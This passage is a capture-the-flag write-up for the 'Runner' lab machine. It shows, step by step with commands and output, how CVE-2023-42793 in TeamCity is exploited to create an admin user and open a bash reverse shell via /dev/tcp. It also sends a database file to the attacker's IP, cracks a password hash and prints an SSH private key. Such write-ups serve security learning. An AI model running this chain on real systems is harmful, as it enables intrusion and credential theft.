+<pre><code class="language-bash">❯ ffuf -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.runner.htb" -u http://runner.htb -mc all -fs 154
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://runner.htb
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
+ :: Header           : Host: FUZZ.runner.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 154
+________________________________________________
+
+teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 333ms]
+:: Progress: [100000/100000] :: Job [1/1] :: 122 req/sec :: Duration: [0:14:06] :: Errors: 0 ::
+</code></pre>
+    
+      <h2 id="teamcity">
+        
+        
+          Teamcity <a href="#teamcity" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h2>
+
+<p>I see a subdomain called teamcity so I will add it to my <code>/etc/hosts</code> file. With curl I can see it returns a 401 status and wants us to go to /login.html:</p>
+
+<pre><code class="language-bash">❯ curl -sS -i http://teamcity.runner.htb
+HTTP/1.1 401 
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 21 Aug 2024 10:55:06 GMT
+Content-Type: text/plain;charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+TeamCity-Node-Id: MAIN_SERVER
+WWW-Authenticate: Basic realm="TeamCity"
+WWW-Authenticate: Bearer realm="TeamCity"
+Cache-Control: no-store
+
+Authentication required
+To login manually go to "/login.html" page
+</code></pre>
+
+<p>Looking in the browser, it redirects directly to /login.html:</p>
+
+<p><img src="/assets/images/Runner/teamcity-main-pag.png" alt="teamcity main page"></p>
+
+<p>That doesn’t happen in curl because the User-Agent, if I specify the same than in my browser (I can view it with the network tab in devtools or intercepting in burpsuite), it also will happen:</p>
+
+<pre><code class="language-bash">❯ curl -sS -i http://teamcity.runner.htb -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0"
+HTTP/1.1 302 
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 21 Aug 2024 12:28:32 GMT
+Content-Length: 0
+Connection: keep-alive
+TeamCity-Node-Id: MAIN_SERVER
+Set-Cookie: TCSESSIONID=8C0FE55E90334478774E38D43B155417; Path=/; HttpOnly
+Location: /login.html
+</code></pre>
+
+<p>Leaving aside the user-agent, I can see its a Teamcity instance. Teamcity is a CI/CD just like said in the landing page (runner.htb):</p>
+
+<p><img src="/assets/images/Runner/what-is-teamcity.png" alt="what is teamcity"></p>
+
+<p>I didn’t know what was a CI/CD, so I searched in google and saw <a href="https://about.gitlab.com/topics/ci-cd/">this gitlab topic</a> that explains it so well. Its a software that can be used for teams of developers to automate the code changes, deploy to production, etc:</p>
+
+<p><img src="/assets/images/Runner/what-is-ci_cd.png" alt="what is CI/CD"></p>
+
+<p>If I manage to gain access to this, it would be so good because I would have the ability see the source code or if I have the permissions, even to run malicious code.</p>
+    
+      <h2 id="cve-2023-42793">
+        
+        
+          CVE-2023-42793 <a href="#cve-2023-42793" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h2>
+
+<p>Searching for vulnerabilities affecting to version 2023.05.3 (which I saw in the teamcity subdomain), I found <a href="https://www.sonarsource.com/blog/teamcity-vulnerability/">this blog post</a> about a vulnerability that the Sonar’s Vulnerability Research Team has discovered that allows Unauthenticated RCE identified with CVE <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-42793">CVE-2023-42793</a>:</p>
+
+<p><img src="/assets/images/Runner/key-information-teamcity-vuln.png" alt="key information teamcity vulnerability"></p>
+
+<p>It consists on a authorization bypass because the use of wildcards to check the url and creating a admin token that can be used to create an admin account to access teamcity.</p>
+
+<p>However, this blog post is written to explain where the vulnerability was and not to exploit it, so I will inspect <a href="https://www.exploit-db.com/exploits/51884">this exploit</a> to abuse it.</p>
+
+<p>First, it checks if the url start with https:// and if true, the resulting curl command will be with <code>-k</code> that makes curl to not verify the ssl certificate:</p>
+
+<pre><code class="language-python">args = parser.parse_args()
+
+url = args.url
+
+if url.startswith("https://"):
+    curl_command = "curl -k"
+else:
+    curl_command = "curl"
+</code></pre>
+
+<p>Then, it makes a POST request to /app/rest/users/id:1/tokens/RPC2 and it handles when the response status code is 200, 404 or 400. In case its 200, it creates a variable named <code>token</code>. If its 404 or 400, it does the same (I don’t know why the exploit creator repeats the code instead of putting <code>elif status_code == 400 or status_code == 404</code>), it deletes the token by using the same url with the DELETE http method:</p>
+
+<pre><code class="language-python">get_token_url = f"{url}/app/rest/users/id:1/tokens/RPC2"
+delete_token_url = f"{url}/app/rest/users/id:1/tokens/RPC2"
+create_user_url = f"{url}/app/rest/users"
+
+create_user_command = ""
+token = ""
+
+response = requests.post(get_token_url, verify=False)
+if response.status_code == 200:
+    match = re.search(r'value="([^"]+)"', response.text)
+    if match:
+        token = match.group(1)
+        print(f"Token: {token}") 
+    else:
+        print("Token not found in the response")
+
+elif response.status_code == 404:
+    print("Token already exists")
+    delete_command = f'{curl_command} -X DELETE {delete_token_url}'
+    delete_process = subprocess.Popen(delete_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    delete_process.wait()
+    delete_output = delete_process.communicate()
+    if delete_process.returncode == 0:
+        print("Previous token deleted successfully\nrun this command again for creating new token &amp; admin user.")
+    else:
+        print("Failed to delete the previous token")
+elif response.status_code == 400:
+    print("Token already exists")
+    delete_command = f'{curl_command} -X DELETE {delete_token_url}'
+    delete_process = subprocess.Popen(delete_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    delete_process.wait()
+    delete_output = delete_process.communicate()
+    if delete_process.returncode == 0:
+        print("Previous token deleted successfully\nrun this command again for creating new token &amp; admin user.")
+    else:
+        print("Failed to delete the previous token")
+else:
+    print("Failed to get a token")
+</code></pre>
+
+<p>Then if the variable token exists, it creates a admin user with the acquired token in an “Authorization: Bearer” header using an API and sending as json (<code>requests.post(create_user_url, headers=headers, json=data)</code>) the username, password, email and roles (the ones required to be admin):</p>
+
+<pre><code class="language-python">if token:
+    headers = {
+        "Authorization": f"Bearer {token}",
+        "Content-Type": "application/json"
+    }
+    random_chars = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(4))
+    username = f"city_admin{random_chars}"
+    data = {
+        "username": username,
+        "password": "Main_password!!**",
+        "email": "angry-admin@funnybunny.org",
+        "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}
+    }
+    create_user_command = f'{curl_command} --path-as-is -H "Authorization: Bearer {token}" -X POST {create_user_url} -H "Content-Type: application/json" --data \'{{"username": "{username}", "password": "theSecretPass!", "email": "nest@nest", "roles": {{"role": [{{"roleId": "SYSTEM_ADMIN", "scope": "g"}}]}}}}\''
+    create_user_response = requests.post(create_user_url, headers=headers, json=data)
+    if create_user_response.status_code == 200:
+        print("Successfully exploited!")
+        print(f"URL: {url}")
+        print(f"Username: {username}")
+        print("Password: Main_password!!**")
+    else:
+        print("Failed to create new admin user")
+</code></pre>
+
+<p>Now that I know how it works, I will create the token to access any functionality of the api:</p>
+
+<pre><code class="language-bash">❯ curl -sS -X POST -i http://teamcity.runner.htb/app/rest/users/id:1/tokens/RPC2
+HTTP/1.1 200 
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 21 Aug 2024 14:08:13 GMT
+Content-Type: application/xml
+Content-Length: 230
+Connection: keep-alive
+TeamCity-Node-Id: MAIN_SERVER
+Cache-Control: no-store
+
+&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;&lt;token name="RPC2" creationTime="2024-08-21T14:08:12.588Z" value="eyJ0eXAiOiAiVENWMiJ9.ejRFN1ptazlJQU5MZEFrSk9QY1B5V2dOWXpN.NWFlNTRkYjQtMDRhNS00NThlLWFhNDctZDgyOThmNWY0ZjZm"/&gt;
+</code></pre>
+
+<p>And create a user with admin privileges like in the script:</p>
+
+<pre><code class="language-bash">❯ curl -sS -X POST -i http://teamcity.runner.htb/app/rest/users -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.ZFVVb2k2OEVUUlV2b0Rtc3l4VGVCdlpWc1Jn.ZTQwYmU3NDItNjgzNS00MTNlLTg1YWYtMTQ4ZWY1ZmI5OWQw" -H "Content-Type: application/json" -d '{"username": "test", "email": "gabri@runner.htb", "password": "gabri123$!", "roles": {"role":[{"roleId": "SYSTEM_ADMIN", "scope":"g"}]}}'
+HTTP/1.1 200 
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 21 Aug 2024 20:42:08 GMT
+Content-Type: application/xml
+Content-Length: 670
+Connection: keep-alive
+TeamCity-Node-Id: MAIN_SERVER
+Cache-Control: no-store
+
+&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;&lt;user username="test" id="13" email="gabri@runner.htb" href="/app/rest/users/id:13"&gt;&lt;properties count="3" href="/app/rest/users/id:13/properties"&gt;&lt;property name="addTriggeredBuildToFavorites" value="true"/&gt;&lt;property name="plugin:vcs:anyVcs:anyVcsRoot" value="test"/&gt;&lt;property name="teamcity.server.buildNumber" value="129390"/&gt;&lt;/properties&gt;&lt;roles&gt;&lt;role roleId="SYSTEM_ADMIN" scope="g" href="/app/rest/users/id:13/roles/SYSTEM_ADMIN/g"/&gt;&lt;/roles&gt;&lt;groups count="1"&gt;&lt;group key="ALL_USERS_GROUP" name="All Users" href="/app/rest/userGroups/key:ALL_USERS_GROUP" description="Contains all TeamCity users"/&gt;&lt;/groups&gt;&lt;/user&gt;
+</code></pre>
+
+<p>After logging in I have access to the teamcity panel:</p>
+
+<p><img src="/assets/images/Runner/access-teamcity-panel.png" alt="access teamcity panel"></p>
+
+<p>Looking in Administration &gt; Users, I can see the users john and matthew (appart from me):</p>
+
+<p><img src="/assets/images/Runner/teamcity-users.png" alt="teamcity users"></p>
+
+<p>I will have them noted.</p>
+    
+      <h1 id="access-as-tcuser-on-1721702">
+        
+        
+          Access as tcuser on 172.17.0.2 <a href="#access-as-tcuser-on-1721702" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+
+<p>I will copy the things that <a href="https://packetstormsecurity.com/files/174860/JetBrains-TeamCity-Unauthenticated-Remote-Code-Execution.html">this exploit</a> does to gain a reverse shell. Before retrieving the token, it modifies an internal.properties file to enable process creation by calling <code>modify_internal_properties(token, 'rest.debug.processes.enable', 'true')</code>:</p>
+
+<pre><code class="language-ruby">print_status('Modifying internal.properties to allow process creation...')
+
+unless modify_internal_properties(token, 'rest.debug.processes.enable', 'true')
+fail_with(Failure::UnexpectedReply, 'Failed to modify the internal.properties config file.')
+end
+</code></pre>
+
+<p>That function makes a post request to /admin/dataDir.html using the token to modify the config/internal.properties with the content <code>key=value</code> that in this case it will be <code>rest.debug.processes.enable=true</code>:</p>
+
+<pre><code class="language-ruby">def modify_internal_properties(token, key, value)
+    res = send_request_cgi(
+      'method' =&gt; 'POST',
+      'uri' =&gt; normalize_uri('/admin/dataDir.html'),
+      'headers' =&gt; {
+        'Authorization' =&gt; "Bearer #{token}"
+      },
+      'vars_get' =&gt; {
+        'action' =&gt; 'edit',
+        'fileName' =&gt; 'config/internal.properties',
+        'content' =&gt; value ? "#{key}=#{value}" : ''
+      }
+    )
+
+    unless res&amp;.code == 200
+      # If we are using an authentication for a non admin user, we cannot modify the internal.properties file. The
+      # server will return a 302 redirect if this is the case. Choose a different TEAMCITY_ADMIN_ID and try again.
+      if res&amp;.code == 302
+        print_warning('This user is not an administrator, try setting the TEAMCITY_ADMIN_ID option to a different ID.')
+      end
+
+      return false
+    end
+
+    # &lt;..SNIP..&gt;
+end
+</code></pre>
+
+<p>After modifying the internal.properties, it finally makes the request to create a process that sends a reverse shell:</p>
+
+<pre><code class="language-ruby">begin
+    print_status('Executing payload...')
+
+    vars_get = {}
+
+    # We need to supply multiple params with the same name, so the TeamCity server (A Java Spring framework) can
+    # construct a List&lt;String&gt; sequence for multiple parameters. We can do this be enabling `compare_by_identity`
+    # in the Ruby Hash.
+    vars_get.compare_by_identity
+
+    case target['Platform']
+    when 'win'
+        vars_get['exePath'] = 'cmd.exe'
+        vars_get['params'] = '/c'
+        vars_get['params'] = payload.encoded
+    when 'linux'
+        vars_get['exePath'] = '/bin/sh'
+        vars_get['params'] = '-c'
+        vars_get['params'] = payload.encoded
+    end
+
+    res = send_request_cgi(
+        'method' =&gt; 'POST',
+        'uri' =&gt; normalize_uri('/app/rest/debug/processes'),
+        'uri_encode_mode' =&gt; 'hex-all', # we must encode all characters in the query param for the payload to work.
+        'headers' =&gt; {
+            'Authorization' =&gt; "Bearer #{token}",
+            'Content-Type' =&gt; 'text/plain'
+        },
+        'vars_get' =&gt; vars_get
+    )
+
+    unless res&amp;.code == 200
+        fail_with(Failure::UnexpectedReply, 'Failed to execute arbitrary process.')
+    end
+    ensure
+    print_status('Resetting the internal.properties settings...')
+
+    unless modify_internal_properties(token, 'rest.debug.processes.enable', nil)
+        fail_with(Failure::UnexpectedReply, 'Failed to modify the internal.properties config file.')
+    end
+end
+</code></pre>
+
+<p>Now that I understand it, I will start by modifying the internal.properties:</p>
+
+<pre><code class="language-bash">❯ curl -sS -i http://teamcity.runner.htb/admin/dataDir.html -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.ejRFN1ptazlJQU5MZEFrSk9QY1B5V2dOWXpN.NWFlNTRkYjQtMDRhNS00NThlLWFhNDctZDgyOThmNWY0ZjZm" -X POST --data 'action=edit&amp;fileName=config/internal.properties&amp;content=rest.debug.processes.enable=true'
+HTTP/1.1 200 
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 21 Aug 2024 17:33:11 GMT
+Content-Type: text/plain
+Content-Length: 0
+Connection: keep-alive
+TeamCity-Node-Id: MAIN_SERVER
+Cache-Control: no-store
+X-Content-Type-Options: nosniff
+</code></pre>
+
+<p>It seems to have worked. the only thing left is to start a nc listener and create the process that gives me a reverse shell:</p>
+
+<pre><code class="language-bash">❯ nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+
+<pre><code class="language-bash">❯ curl -sS -i 'http://teamcity.runner.htb/app/rest/debug/processes' -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.X2RkS1ZKczMtdk03SHM3ZDRKdjFheF9OZHBN.YjA3NTUyZTEtM2YzNS00YjM1LTk2Y2ItNzkwODJmZmYxNmZl" -H "Content-Type: text/plain" -G --data-urlencode 'exePath=/bin/bash' --data-urlencode 'params=-c' --data-urlencode 'params=bash -i &gt;&amp; /dev/tcp/10.10.14.106/443 0&gt;&amp;1' -X POST
+</code></pre>
+
+<p>And I receive a shell as tcuser in a container:</p>
+
+<p><img src="/assets/images/Runner/shell-received-as-tcuser-in-container.png" alt="shell received as tcuser on container"></p>
+
+<p>Now I will do the tty treatment to have a completely interactive shell where I can do ctrl+c and ctrl+l among other things:</p>
+
+<pre><code class="language-bash">tcuser@647a82f29ca0:~/bin$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+   Welcome to TeamCity Server Docker container
+
+ * Installation directory: /opt/teamcity
+ * Logs directory:         /opt/teamcity/logs
+ * Data directory:         /data/teamcity_server/datadir
+
+   TeamCity will be running under 'tcuser' user (1000/1000)
+
+tcuser@647a82f29ca0:~/bin$ ^Z
+[1]  + 746936 suspended  nc -lvnp 443
+❯ stty raw -echo; fg
+[1]  + 746936 continued  nc -lvnp 443
+                                     reset xterm
+tcuser@647a82f29ca0:~/bin$ export TERM=xterm
+tcuser@647a82f29ca0:~/bin$ export SHELL=bash
+tcuser@647a82f29ca0:~/bin$ stty rows 50 cols 184
+</code></pre>
+
+<ul>
+  <li>
+<code>script /dev/null -c bash</code>: Spawns a tty.</li>
+  <li>
+<code>ctrl+z</code>: puts the shell in background for later doing a treatment.</li>
+  <li>
+<code>stty raw -echo;fg</code>: gives the shell back again.</li>
+  <li>
+<code>reset xterm</code>: resets the terminal to give the bash console.</li>
+  <li>
+<code>export TERM=xterm</code>: let do ctrl+l to clean the terminal.</li>
+  <li>
+<code>export SHELL=bash</code>: specifies the system that it’s using a bash console.</li>
+  <li>
+<code>stty rows &lt;YOUR ROWS&gt; cols &lt;YOUR COLUMNS&gt;</code>: sets the size of the current full terminal window. It is possible to view the right size for your window running <code>stty size</code> in a entire new window on your terminal.</li>
+</ul>
+
+<p>To enumerate the credentials of the registered users in teamcity, I will see its using a HSQLDB file to access the database in <code>/data/teamcity_server/datadir/config/database.properties</code>:</p>
+
+<pre><code class="language-bash">tcuser@647a82f29ca0:/data/teamcity_server/datadir/config$ cat database.properties
+#Wed Feb 28 10:37:02 GMT 2024
+connectionUrl=jdbc\:hsqldb\:file\:$TEAMCITY_SYSTEM_PATH/buildserver
+</code></pre>
+
+<p>Reading the <a href="https://www.hsqldb.org/doc/2.0/guide/running-chapt.html#rgc_hsqldb_db">hsql documentation</a>, I can see that a specified file consists in various files like “.properties”, “.data”, “.log”, etc:</p>
+
+<p><img src="/assets/images/Runner/hsql-file-consists-in-various-files.png" alt="hsql file consists in various files"></p>
+
+<p>So I will search recursively for these files with find:</p>
+
+<pre><code class="language-bash">tcuser@647a82f29ca0:/data/teamcity_server/datadir/config$ find / -name buildserver\* 2&gt;/dev/null
+/data/teamcity_server/datadir/system/buildserver.log
+/data/teamcity_server/datadir/system/buildserver.tmp
+/data/teamcity_server/datadir/system/buildserver.properties
+/data/teamcity_server/datadir/system/buildserver.script
+/data/teamcity_server/datadir/system/buildserver.lck
+/data/teamcity_server/datadir/system/buildserver.data
+</code></pre>
+
+<p>And I can see they are in /data/teamcity_server/datadir/system directory. I will download the .data to my machine as its the most interesting:</p>
+
+<p><strong>Attacker</strong></p>
+<pre><code class="language-bash">❯ nc -lvnp 443 &gt; buildserver.data
+listening on [any] 443 ...
+</code></pre>
+
+<p><strong>Victim</strong></p>
+<pre><code class="language-bash">tcuser@647a82f29ca0:/data/teamcity_server/datadir/config$ cat  /data/teamcity_server/datadir/system/buildserver.data &gt; /dev/tcp/10.10.14.106/443
+</code></pre>
+
+<p>Just doing a strings to the file shows the password hashes for the users:</p>
+
+<pre><code class="language-bash">❯ strings buildserver.data | less
+</code></pre>
+<p><img src="/assets/images/Runner/password-hashes-in-.data-database-file.png" alt="password hashes in database"></p>
+
+<p>The others are users created by me and other machine players so the relevant users are john and matthew. I will put each user with its hash in a separate file to run hashcat for each user separately. I will create matthew.hash and john.hash. The crackable hash is the matthew’s one and the john’s hash doesn’t crack:</p>
+
+<pre><code class="language-bash">&gt; hashcat -m 3200 matthew.hash rockyou.txt
+hashcat (v6.2.6) starting
+
+&lt;..SNIP..&gt;
+$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em:piper123
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGL...eVo.Em
+Time.Started.....: Thu Aug 22 10:18:50 2024 (1 min, 9 secs)
+Time.Estimated...: Thu Aug 22 10:19:59 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      757 H/s (8.78ms) @ Accel:2 Loops:8 Thr:8 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 52080/14344385 (0.36%)
+Rejected.........: 0/52080 (0.00%)
+Restore.Point....: 51968/14344385 (0.36%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:120-128
+Candidate.Engine.: Device Generator
+Candidates.#1....: rockbaby -&gt; nichole3
+Hardware.Mon.#1..: Util: 97% Core: 400MHz Mem:1500MHz Bus:16
+
+Started: Thu Aug 22 10:18:45 2024
+Stopped: Thu Aug 22 10:20:00 2024
+</code></pre>
+
+<p>The password for matthew is piper123 but it doesn’t work for ssh as matthew or john:</p>
+
+<pre><code class="language-bash">❯ ssh matthew@runner.htb
+matthew@runner.htb's password: piper123
+Permission denied, please try again.
+</code></pre>
+<pre><code class="language-bash">❯ ssh john@runner.htb
+john@runner.htb's password: piper123
+Permission denied, please try again.
+</code></pre>
+
+<p>For now, there is no other interesting place to reuse this password because I already gained access as the user that runs teamcity, so I will look other things</p>
+    
+      <h1 id="access-as-john-in-runner">
+        
+        
+          Access as john in runner <a href="#access-as-john-in-runner" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+
+<p>The teamcity_server folder I saw before is probably to store the data of teamcity.</p>
+
+<p>In /data/teamcity_server/datadir, the most interesting folder is <code>config</code>, so I will look files inside it:</p>
+
+<pre><code class="language-bash">tcuser@647a82f29ca0:/data/teamcity_server/datadir$ find config/ -type f | grep -vE '\.ftl|\.dist$|_logging'
+config/auth-config.dtd
+config/backup-config.xml
+config/roles-config.xml
+config/_trash/AllProjects.project1/project-config.xml
+config/ntlm-config.properties
+config/main-config.xml
+config/main-config.dtd
+config/roles-config.dtd
+config/_auth/auth-preset.dtd
+config/_auth/ldap.xml
+config/_auth/ldap-ntlm.xml
+config/_auth/default.xml
+config/_auth/nt-domain.xml
+config/auth-config.xml
+config/database.properties
+config/_notifications/email/email-config.dtd
+config/_notifications/email/email-config.xml
+config/nodes-config.xml
+config/projects/_Root/project-config.xml
+config/projects/Asdas/buildTypes/Asdas_Asdss.xml.1
+config/projects/Asdas/buildTypes/Asdas_Asdss.xml.2
+config/projects/Asdas/buildTypes/Asdas_Asdss.xml
+config/projects/Asdas/project-config.xml
+config/projects/AllProjects/pluginData/ssh_keys/id_rsa
+config/projects/AllProjects/project-config.xml.1
+config/projects/AllProjects/project-config.xml
+config/internal.properties
+config/ldap-mapping.dtd
+config/disabled-plugins.xml
+</code></pre>
+
+<p>There is a id_rsa in <code>config/projects/AllProjects/pluginData/ssh_keys/id_rsa</code>, testing it with the users I saw before, it works with john:</p>
+
+<pre><code class="language-bash">❯ /bin/cat teamcity-id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAlk2rRhm7T2dg2z3+Y6ioSOVszvNlA4wRS4ty8qrGMSCpnZyEISPl
+htHGpTu0oGI11FTun7HzQj7Ore7YMC+SsMIlS78MGU2ogb0Tp2bOY5RN1/X9MiK/SE4liT
+njhPU1FqBIexmXKlgS/jv57WUtc5CsgTUGYkpaX6cT2geiNqHLnB5QD+ZKJWBflF6P9rTt
+zkEdcWYKtDp0Phcu1FUVeQJOpb13w/L0GGiya2RkZgrIwXR6l3YCX+mBRFfhRFHLmd/lgy
+/R2GQpBWUDB9rUS+mtHpm4c3786g11IPZo+74I7BhOn1Iz2E5KO0tW2jefylY2MrYgOjjq
+5fj0Fz3eoj4hxtZyuf0GR8Cq1AkowJyDP02XzIvVZKCMDgVNAMH5B7COTX8CjUzc0vuKV5
+iLSi+vRx6vYQpQv4wlh1H4hUlgaVSimoAqizJPUqyAi9oUhHXGY71x5gCUXeULZJMcDYKB
+Z2zzex3+iPBYi9tTsnCISXIvTDb32fmm1qRmIRyXAAAFgGL91WVi/dVlAAAAB3NzaC1yc2
+EAAAGBAJZNq0YZu09nYNs9/mOoqEjlbM7zZQOMEUuLcvKqxjEgqZ2chCEj5YbRxqU7tKBi
+NdRU7p+x80I+zq3u2DAvkrDCJUu/DBlNqIG9E6dmzmOUTdf1/TIiv0hOJYk544T1NRagSH
+sZlypYEv47+e1lLXOQrIE1BmJKWl+nE9oHojahy5weUA/mSiVgX5Rej/a07c5BHXFmCrQ6
+dD4XLtRVFXkCTqW9d8Py9BhosmtkZGYKyMF0epd2Al/pgURX4URRy5nf5YMv0dhkKQVlAw
+fa1EvprR6ZuHN+/OoNdSD2aPu+COwYTp9SM9hOSjtLVto3n8pWNjK2IDo46uX49Bc93qI+
+IcbWcrn9BkfAqtQJKMCcgz9Nl8yL1WSgjA4FTQDB+Qewjk1/Ao1M3NL7ileYi0ovr0cer2
+EKUL+MJYdR+IVJYGlUopqAKosyT1KsgIvaFIR1xmO9ceYAlF3lC2STHA2CgWds83sd/ojw
+WIvbU7JwiElyL0w299n5ptakZiEclwAAAAMBAAEAAAGABgAu1NslI8vsTYSBmgf7RAHI4N
+BN2aDndd0o5zBTPlXf/7dmfQ46VTId3K3wDbEuFf6YEk8f96abSM1u2ymjESSHKamEeaQk
+lJ1wYfAUUFx06SjchXpmqaPZEsv5Xe8OQgt/KU8BvoKKq5TIayZtdJ4zjOsJiLYQOp5oh/
+1jCAxYnTCGoMPgdPKOjlViKQbbMa9e1g6tYbmtt2bkizykYVLqweo5FF0oSqsvaGM3MO3A
+Sxzz4gUnnh2r+AcMKtabGye35Ax8Jyrtr6QAo/4HL5rsmN75bLVMN/UlcCFhCFYYRhlSay
+yeuwJZVmHy0YVVjxq3d5jiFMzqJYpC0MZIj/L6Q3inBl/Qc09d9zqTw1wAd1ocg13PTtZA
+mgXIjAdnpZqGbqPIJjzUYua2z4mMOyJmF4c3DQDHEtZBEP0Z4DsBCudiU5QUOcduwf61M4
+CtgiWETiQ3ptiCPvGoBkEV8ytMLS8tx2S77JyBVhe3u2IgeyQx0BBHqnKS97nkckXlAAAA
+wF8nu51q9C0nvzipnnC4obgITpO4N7ePa9ExsuSlIFWYZiBVc2rxjMffS+pqL4Bh776B7T
+PSZUw2mwwZ47pIzY6NI45mr6iK6FexDAPQzbe5i8gO15oGIV9MDVrprjTJtP+Vy9kxejkR
+3np1+WO8+Qn2E189HvG+q554GQyXMwCedj39OY71DphY60j61BtNBGJ4S+3TBXExmY4Rtg
+lcZW00VkIbF7BuCEQyqRwDXjAk4pjrnhdJQAfaDz/jV5o/cAAAAMEAugPWcJovbtQt5Ui9
+WQaNCX1J3RJka0P9WG4Kp677ZzjXV7tNufurVzPurrxyTUMboY6iUA1JRsu1fWZ3fTGiN/
+TxCwfxouMs0obpgxlTjJdKNfprIX7ViVrzRgvJAOM/9WixaWgk7ScoBssZdkKyr2GgjVeE
+7jZoobYGmV2bbIDkLtYCvThrbhK6RxUhOiidaN7i1/f1LHIQiA4+lBbdv26XiWOw+prjp2
+EKJATR8rOQgt3xHr+exgkGwLc72Q61AAAAwQDO2j6MT3aEEbtgIPDnj24W0xm/r+c3LBW0
+axTWDMGzuA9dg6YZoUrzLWcSU8cBd+iMvulqkyaGud83H3C17DWLKAztz7pGhT8mrWy5Ox
+KzxjsB7irPtZxWmBUcFHbCrOekiR56G2MUCqQkYfn6sJ2v0/Rp6PZHNScdXTMDEl10qtAW
+QHkfhxGO8gimrAvjruuarpItDzr4QcADDQ5HTU8PSe/J2KL3PY7i4zWw9+/CyPd0t9yB5M
+KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+
+<pre><code class="language-bash">❯ chmod 600 teamcity-id_rsa
+❯ ssh -i teamcity-id_rsa john@runner.htb
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+&lt;..SNIP&gt;
+john@runner:~$ 
+</code></pre>
+
+<p>And I can see user.txt:</p>
+
+<pre><code class="language-bash">john@runner:~$ cat user.txt 
+41****************************d1
+</code></pre>
+    
+      <h1 id="access-as-root">
+        
+        
+          Access as root <a href="#access-as-root" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+
+<p>Looking at internal ports open at localhost, I can see port 9443, 53 (DNS), 8111, 5005 and 9000:</p>
+
+<pre><code class="language-bash">john@runner:~$ netstat -ntlp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::8000                 :::*                    LISTEN      -
+</code></pre>
+
+<p>8111 is for teamcity, 5005 gives an empty reply and 9443 is same as 9000 but ssl version:</p>
+
+<p><strong>8111</strong></p>
+<pre><code class="language-bash">john@runner:~$ curl -i localhost:8111; echo
+HTTP/1.1 401 
+TeamCity-Node-Id: MAIN_SERVER
+WWW-Authenticate: Basic realm="TeamCity"
+WWW-Authenticate: Bearer realm="TeamCity"
+Cache-Control: no-store
+Content-Type: text/plain;charset=UTF-8
+Transfer-Encoding: chunked
+Date: Thu, 22 Aug 2024 07:09:44 GMT
+
+Authentication required
